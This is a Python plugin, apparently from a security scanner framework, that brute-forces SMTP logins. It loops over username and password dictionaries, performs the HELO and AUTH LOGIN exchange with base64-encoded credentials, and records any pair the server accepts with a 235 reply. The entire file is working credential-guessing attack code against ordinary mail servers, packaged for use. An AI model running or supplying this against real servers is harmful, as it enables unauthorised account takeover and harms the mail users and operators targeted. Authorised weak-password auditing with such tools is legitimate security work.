#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import socket,base64
from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.SMTP
        self.name = 'smtp burst'
        self.keyword = ['smtp', 'burst']
        self.info = 'smtp burst'
        self.type = 'weakpass'
        self.level = 'high'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        if _socket_connect(self.target_host, self.target_port):
            usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file('dict/smtp_usernames.txt')
            passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file('dict/smtp_passwords.txt')
            for linef1 in usernamedic:
                username = linef1.strip('\r').strip('\n')
                for linef2 in passworddic:
                    password = (
                        linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                        '\r').strip('\n')
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((self.target_host, self.target_port))
                        banner = str(s.recv(1024))
                        emailaddress = '.'.join(self.target_host.split('.')[1:])
                        # print(banner)
                        if "220" in banner:
                            s.send(bytes('HELO mail.' + emailaddress + ' \r\n', 'utf-8'))
                            helo = str(s.recv(1024))
                            # print(helo)
                            if "250" in helo:
                                s.send(bytes('auth login \r\n', 'utf-8'))
                                authanswer = str(s.recv(1024))
                                # print(authanswer)
                                if "334" in authanswer:
                                    s.send(base64.b64encode(bytes(username ,encoding='utf-8'))+ b'\r\n')
                                    useranswer = str(s.recv(1024))
                                    # print(useranswer)
                                    if "334" in useranswer:
                                        s.send(base64.b64encode(bytes(password,encoding='utf-8'))+ b'\r\n')
                                        # print(username + "/" + password)
                                        passanswer = str(s.recv(1024))
                                        # print(passanswer)
                                        if "235" in passanswer:
                                            self.flag = 1
                                            self.req.append({"username": username, "password": password})
                                            self.res.append({"info": username + "/" + password, "key": 'smtp'})
                                            return
                    except:
                        pass

def _socket_connect(ip, port,msg = "test"):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        s.sendall(bytes(msg, 'utf-8'))
        message = str(s.recv(1024))
        s.close()
        return True
    except:
        return False
